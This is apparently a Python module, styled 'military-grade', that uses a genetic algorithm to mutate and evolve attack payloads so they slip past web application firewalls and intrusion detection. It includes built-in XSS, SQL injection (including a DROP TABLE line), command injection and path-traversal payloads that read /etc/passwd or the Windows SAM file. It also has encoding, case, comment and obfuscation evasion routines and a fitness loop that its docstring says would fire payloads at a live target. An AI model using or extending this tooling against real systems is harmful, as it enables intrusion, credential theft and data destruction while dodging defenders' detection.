"""
EXTREME Payload Optimizer with Genetic Algorithms

This module implements military-grade payload optimization using:
- Genetic algorithm payload evolution
- Context-aware payload mutation
- WAF/IDS evasion strategy selection
- Multi-objective optimization (stealth + effectiveness)

Features:
- Evolutionary payload generation
- Fitness function optimization
- Crossover and mutation operators
- Evasion technique database
- Adaptive strategy selection
"""

import random
import hashlib
import logging
from typing import Dict, Any, List, Optional, Tuple, Callable
from dataclasses import dataclass, field
from enum import Enum
import re

logger = logging.getLogger(__name__)


class EvasionTechnique(Enum):
    """Evasion techniques for bypassing security controls"""
    ENCODING = "encoding"
    OBFUSCATION = "obfuscation"
    FRAGMENTATION = "fragmentation"
    CASE_VARIATION = "case_variation"
    WHITESPACE_MANIPULATION = "whitespace_manipulation"
    COMMENT_INSERTION = "comment_insertion"
    UNICODE_TRICKS = "unicode_tricks"
    NULL_BYTE = "null_byte"
    DOUBLE_ENCODING = "double_encoding"
    MIXED_ENCODING = "mixed_encoding"


@dataclass
class PayloadGenome:
    """Genetic representation of a payload"""
    payload: str
    fitness: float = 0.0
    generation: int = 0
    evasion_techniques: List[EvasionTechnique] = field(default_factory=list)
    effectiveness_score: float = 0.0
    stealth_score: float = 0.0
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            'payload': self.payload,
            'fitness': self.fitness,
            'generation': self.generation,
            'evasion_techniques': [t.value for t in self.evasion_techniques],
            'effectiveness_score': self.effectiveness_score,
            'stealth_score': self.stealth_score,
        }


class ExtremePayloadOptimizer:
    """
    Military-grade payload optimizer using genetic algorithms.
    
    Evolves payloads to maximize effectiveness while minimizing
    detection by WAF/IDS systems.
    """
    
    # Base payloads for different vulnerability types
    BASE_PAYLOADS = {
        'xss': [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
        ],
        'sqli': [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "' AND 1=1--",
            "'; DROP TABLE users--",
            "' OR SLEEP(5)--",
        ],
        'command': [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "`id`",
            "$(uname -a)",
        ],
        'traversal': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
        ],
    }
    
    # Encoding transformations
    ENCODINGS = {
        'url': lambda s: ''.join(f'%{ord(c):02x}' for c in s),
        'html': lambda s: ''.join(f'&#{ord(c)};' for c in s),
        'unicode': lambda s: ''.join(f'\\u{ord(c):04x}' for c in s),
        'hex': lambda s: ''.join(f'\\x{ord(c):02x}' for c in s),
    }
    
    def __init__(self,
                 vulnerability_type: str,
                 population_size: int = 20,
                 max_generations: int = 10,
                 mutation_rate: float = 0.3,
                 crossover_rate: float = 0.7):
        """
        Initialize payload optimizer.
        
        Args:
            vulnerability_type: Type of vulnerability to optimize for
            population_size: Number of payloads in population
            max_generations: Maximum number of generations
            mutation_rate: Probability of mutation
            crossover_rate: Probability of crossover
        """
        self.vulnerability_type = vulnerability_type.lower()
        self.population_size = population_size
        self.max_generations = max_generations
        self.mutation_rate = mutation_rate
        self.crossover_rate = crossover_rate
        
        self.population: List[PayloadGenome] = []
        self.generation = 0
        self.best_payload: Optional[PayloadGenome] = None
    
    def evolve(self, 
               fitness_function: Callable[[str], Tuple[float, float]],
               target_context: Dict[str, Any] = None) -> List[PayloadGenome]:
        """
        Evolve payloads using genetic algorithm.
        
        Args:
            fitness_function: Function that scores payload (effectiveness, stealth)
            target_context: Context about target (WAF type, filters, etc.)
            
        Returns:
            List of evolved payloads sorted by fitness
        """
        target_context = target_context or {}
        
        # Initialize population
        self._initialize_population()
        
        # Evolution loop
        for gen in range(self.max_generations):
            self.generation = gen
            
            # Evaluate fitness
            for genome in self.population:
                effectiveness, stealth = fitness_function(genome.payload)
                genome.effectiveness_score = effectiveness
                genome.stealth_score = stealth
                genome.fitness = self._calculate_fitness(effectiveness, stealth)
                genome.generation = gen
            
            # Sort by fitness
            self.population.sort(key=lambda g: g.fitness, reverse=True)
            
            # Update best
            if not self.best_payload or self.population[0].fitness > self.best_payload.fitness:
                self.best_payload = self.population[0]
            
            logger.info(f"Generation {gen}: Best fitness = {self.best_payload.fitness:.3f}")
            
            # Create next generation
            if gen < self.max_generations - 1:
                self.population = self._create_next_generation()
        
        # Final sort
        self.population.sort(key=lambda g: g.fitness, reverse=True)
        
        return self.population
    
    def _initialize_population(self):
        """Initialize population with base payloads"""
        base_payloads = self.BASE_PAYLOADS.get(self.vulnerability_type, ["test"])
        
        self.population = []
        
        # Add base payloads
        for payload in base_payloads:
            genome = PayloadGenome(payload=payload, generation=0)
            self.population.append(genome)
        
        # Generate variations to fill population
        while len(self.population) < self.population_size:
            # Pick random base payload
            base = random.choice(base_payloads)
            
            # Apply random mutations
            mutated = self._mutate(base)
            
            genome = PayloadGenome(payload=mutated, generation=0)
            self.population.append(genome)
    
    def _calculate_fitness(self, effectiveness: float, stealth: float) -> float:
        """
        Calculate overall fitness score.
        
        Multi-objective optimization: maximize effectiveness and stealth
        
        Args:
            effectiveness: How effective the payload is (0-1)
            stealth: How stealthy the payload is (0-1)
            
        Returns:
            Fitness score
        """
        # Weighted combination
        # Effectiveness is more important, but stealth prevents detection
        return (effectiveness * 0.7) + (stealth * 0.3)
    
    def _create_next_generation(self) -> List[PayloadGenome]:
        """Create next generation through selection, crossover, and mutation"""
        next_gen = []
        
        # Elitism: Keep top 10% unchanged
        elite_count = max(1, int(self.population_size * 0.1))
        next_gen.extend(self.population[:elite_count])
        
        # Generate rest through crossover and mutation
        while len(next_gen) < self.population_size:
            # Selection
            parent1 = self._tournament_selection()
            parent2 = self._tournament_selection()
            
            # Crossover
            if random.random() < self.crossover_rate:
                child = self._crossover(parent1, parent2)
            else:
                child = parent1.payload
            
            # Mutation
            if random.random() < self.mutation_rate:
                child = self._mutate(child)
            
            genome = PayloadGenome(payload=child, generation=self.generation + 1)
            next_gen.append(genome)
        
        return next_gen
    
    def _tournament_selection(self, tournament_size: int = 3) -> PayloadGenome:
        """Select parent using tournament selection"""
        tournament = random.sample(self.population, min(tournament_size, len(self.population)))
        return max(tournament, key=lambda g: g.fitness)
    
    def _crossover(self, parent1: PayloadGenome, parent2: PayloadGenome) -> str:
        """Perform crossover between two payloads"""
        p1 = parent1.payload
        p2 = parent2.payload
        
        # Single-point crossover
        if len(p1) > 2 and len(p2) > 2:
            point = random.randint(1, min(len(p1), len(p2)) - 1)
            child = p1[:point] + p2[point:]
        else:
            child = random.choice([p1, p2])
        
        return child
    
    def _mutate(self, payload: str) -> str:
        """Apply mutation to payload"""
        mutations = [
            self._mutation_encoding,
            self._mutation_obfuscation,
            self._mutation_case_variation,
            self._mutation_whitespace,
            self._mutation_comment_insertion,
            self._mutation_character_substitution,
        ]
        
        # Apply random mutation
        mutation_func = random.choice(mutations)
        mutated = mutation_func(payload)
        
        return mutated
    
    def _mutation_encoding(self, payload: str) -> str:
        """Apply encoding mutation"""
        encoding_type = random.choice(['url', 'html', 'unicode', 'hex'])
        
        if encoding_type == 'url':
            # URL encode some characters
            chars_to_encode = random.sample(range(len(payload)), k=min(3, len(payload)))
            result = list(payload)
            for idx in chars_to_encode:
                result[idx] = f'%{ord(payload[idx]):02x}'
            return ''.join(result)
        
        elif encoding_type == 'html':
            # HTML entity encode some characters
            chars_to_encode = random.sample(range(len(payload)), k=min(2, len(payload)))
            result = list(payload)
            for idx in chars_to_encode:
                result[idx] = f'&#{ord(payload[idx])};'
            return ''.join(result)
        
        else:
            return payload
    
    def _mutation_obfuscation(self, payload: str) -> str:
        """Apply obfuscation mutation"""
        # Add JavaScript obfuscation for XSS
        if self.vulnerability_type == 'xss' and 'alert' in payload.lower():
            obfuscations = [
                lambda p: p.replace('alert', 'top[\'al\'+\'ert\']'),
                lambda p: p.replace('alert', 'window[\'alert\']'),
                lambda p: p.replace('alert', 'eval(\'ale\'+\'rt\')'),
            ]
            return random.choice(obfuscations)(payload)
        
        # Add SQL comment obfuscation
        elif self.vulnerability_type == 'sqli':
            return payload.replace(' ', '/**/') if ' ' in payload else payload
        
        return payload
    
    def _mutation_case_variation(self, payload: str) -> str:
        """Apply case variation mutation"""
        # Randomly change case of some characters
        result = []
        for char in payload:
            if char.isalpha() and random.random() < 0.3:
                result.append(char.swapcase())
            else:
                result.append(char)
        return ''.join(result)
    
    def _mutation_whitespace(self, payload: str) -> str:
        """Apply whitespace manipulation"""
        # Add or remove whitespace
        if random.random() < 0.5:
            # Add spaces
            idx = random.randint(0, len(payload))
            return payload[:idx] + ' ' + payload[idx:]
        else:
            # Remove spaces
            return payload.replace(' ', '')
    
    def _mutation_comment_insertion(self, payload: str) -> str:
        """Insert comments for evasion"""
        if self.vulnerability_type == 'sqli':
            comments = ['/**/', '--', '#']
            comment = random.choice(comments)
            idx = random.randint(0, len(payload))
            return payload[:idx] + comment + payload[idx:]
        
        return payload
    
    def _mutation_character_substitution(self, payload: str) -> str:
        """Substitute characters with equivalents"""
        # For XSS, substitute with HTML entities
        if self.vulnerability_type == 'xss':
            substitutions = {
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#39;',
            }
            
            # Randomly apply one substitution
            if random.random() < 0.3:
                for char, entity in substitutions.items():
                    if char in payload and random.random() < 0.5:
                        payload = payload.replace(char, entity, 1)
                        break
        
        return payload
    
    def apply_evasion_technique(self,
                               payload: str,
                               technique: EvasionTechnique) -> str:
        """
        Apply specific evasion technique to payload.
        
        Args:
            payload: Original payload
            technique: Evasion technique to apply
            
        Returns:
            Modified payload
        """
        if technique == EvasionTechnique.ENCODING:
            return self._mutation_encoding(payload)
        
        elif technique == EvasionTechnique.OBFUSCATION:
            return self._mutation_obfuscation(payload)
        
        elif technique == EvasionTechnique.CASE_VARIATION:
            return self._mutation_case_variation(payload)
        
        elif technique == EvasionTechnique.WHITESPACE_MANIPULATION:
            return self._mutation_whitespace(payload)
        
        elif technique == EvasionTechnique.COMMENT_INSERTION:
            return self._mutation_comment_insertion(payload)
        
        elif technique == EvasionTechnique.DOUBLE_ENCODING:
            # Apply encoding twice
            temp = self._mutation_encoding(payload)
            return self._mutation_encoding(temp)
        
        else:
            return payload
    
    def get_top_payloads(self, n: int = 5) -> List[PayloadGenome]:
        """Get top N payloads by fitness"""
        return self.population[:n]
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get optimizer statistics"""
        if not self.population:
            return {
                'population_size': 0,
                'generation': 0,
                'best_fitness': 0.0,
            }
        
        return {
            'population_size': len(self.population),
            'generation': self.generation,
            'best_fitness': self.best_payload.fitness if self.best_payload else 0.0,
            'avg_fitness': sum(g.fitness for g in self.population) / len(self.population),
            'best_payload': self.best_payload.payload if self.best_payload else None,
        }


def create_payload_optimizer(vulnerability_type: str,
                            **kwargs) -> ExtremePayloadOptimizer:
    """
    Create a payload optimizer instance.
    
    Args:
        vulnerability_type: Type of vulnerability
        **kwargs: Additional parameters for optimizer
        
    Returns:
        ExtremePayloadOptimizer instance
    """
    return ExtremePayloadOptimizer(vulnerability_type, **kwargs)


# Example fitness function
def example_fitness_function(payload: str) -> Tuple[float, float]:
    """
    Example fitness function for testing.
    
    In production, this would:
    - Send payload to target
    - Check if it worked (effectiveness)
    - Check if it was detected (stealth)
    
    Returns:
        Tuple of (effectiveness, stealth)
    """
    # Simplified scoring
    effectiveness = min(len(payload) / 50.0, 1.0)  # Longer = more complex
    stealth = 1.0 - (payload.count('<') + payload.count('script')) / 10.0  # Less obvious = stealthier
    stealth = max(0.0, stealth)
    
    return effectiveness, stealth
